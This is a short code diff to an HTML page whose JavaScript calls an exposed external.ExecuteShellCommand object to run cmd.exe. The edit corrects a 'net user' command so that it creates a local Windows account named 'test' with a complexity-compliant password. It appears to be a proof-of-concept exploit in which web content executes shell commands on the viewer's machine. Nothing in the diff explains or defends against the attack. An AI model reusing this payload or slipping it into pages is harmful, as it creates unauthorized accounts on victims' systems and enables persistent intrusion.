@@ -9,7 +9,7 @@
     <script type="text/javascript">
         function executeCommand() {
             try {
-                external.ExecuteShellCommand("cmd.exe", "", "/c net user add test 111111", "open")
+                external.ExecuteShellCommand("cmd.exe", "", "/c net user test /add 1Qq1Qq1111", "open")
             } catch (e) {
                 alert("Failed to execute command: " + e.message);
             }
